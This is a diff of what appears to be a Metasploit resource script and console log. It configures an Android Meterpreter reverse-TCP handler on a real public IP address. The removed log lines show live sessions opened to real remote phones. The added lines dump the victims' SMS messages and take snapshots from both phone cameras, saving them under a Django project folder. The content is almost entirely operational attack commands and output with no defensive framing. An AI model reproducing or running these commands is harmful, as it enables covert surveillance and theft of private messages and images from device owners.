@@ -3,20 +3,31 @@ use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
 set ExitOnSession true
 set lhost 185.120.221.217
-set lport 4452
+set lport 4454
 exploit
+dump_sms -o /root/django/users/test/dumpsms.txt.|
 
-                                   ____________
- [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
- [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
- [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
- [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
- [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
- [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
- [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
- [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
- [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
- [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |
+  +---------------------------+---------------------------+
+  |      __________________   |                           |
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
+  |             )=\           | |  EXPLOIT   \            |
+  |            // \\          | |_____________\_______    |
+  |           //   \\         | |==[msf >]============\   |
+  |          //     \\        | |______________________\  |
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
+  |        //         \\      |  *********************    |
+  +---------------------------+---------------------------+
+  |      o O o                |        \'\/\/\/'/         |
+  |              o O          |         )======(          |
+  |                 o         |       .'  LOOT  '.        |
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
+  | |________________|__|)__| |    |     __||_)     |     |
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
+  |  = = = = = = = = = = = =  |     '--------------'      |
+  +---------------------------+---------------------------+
 
 
        =[ metasploit v5.0.5-dev                           ]
@@ -31,50 +42,13 @@ msf5 exploit(multi/handler) > set ExitOnSession true
 ExitOnSession => true
 msf5 exploit(multi/handler) > set lhost 185.120.221.217
 lhost => 185.120.221.217
-msf5 exploit(multi/handler) > set lport 4452
-lport => 4452
+msf5 exploit(multi/handler) > set lport 4454
+lport => 4454
 msf5 exploit(multi/handler) > exploit
 
-[*] Started reverse TCP handler on 185.120.221.217:4452
-[*] Sending stage (70653 bytes) to 5.117.0.209
-[*] Sending stage (70653 bytes) to 5.115.175.198
-[*] Meterpreter session 1 opened (185.120.221.217:4452 -> 5.115.175.198:38170) a
-t 2019-02-11 11:56:42 +0000
-[*] Sending stage (70653 bytes) to 5.115.175.198
-[*] 5.115.175.198 - Meterpreter session 1 closed.  Reason: Died
-[*] Meterpreter session 2 opened (185.120.221.217:4452 -> 5.115.175.198:38171) a
-t 2019-02-11 11:57:48 +0000
-
-ls
-^C[-] Exploit failed [user-interrupt]: Interrupt
-[-] exploit: Interrupted
-msf5 exploit(multi/handler) > sessions
-
-Active sessions
-===============
-
-  Id  Name  Type                      Information  Connection
-  --  ----  ----                      -----------  ----------
-  2         meterpreter java/android               185.120.221.217:4452 -> 5.115
-.175.198:38171 (5.115.175.198)
-
-msf5 exploit(multi/handler) > sessions -i 2
-[*] Starting interaction with 2...
-
-meterpreter > dump_sms
-[-] Unknown command: dump_sms.
-meterpreter > exit
-[*] Shutting down Meterpreter...
-
-[*] 5.115.175.198 - Meterpreter session 2 closed.  Reason: User exit
-msf5 exploit(multi/handler) > ruun
-^CInterrupt: use the 'exit' command to quit
-msf5 exploit(multi/handler) > ruu
-zlib(finalizer): the stream was freed prematurely.
-[-] Unknown command: ruu.
-msf5 exploit(multi/handler) > run
-
-[*] Started reverse TCP handler on 185.120.221.217:4452
+[*] Started reverse TCP handler on 185.120.221.217:4454
 dump_sms -o /root/django/users/test/dumpsms.txt
+webcam_snap -i 1 -p /root/django/users/test/webcamsnap1.jpeg
+webcam_snap -i 2 -p /root/django/users/test/webcamsnap2.jpg
 dump_sms -o /root/django/users/test/dumpsms.txt
 
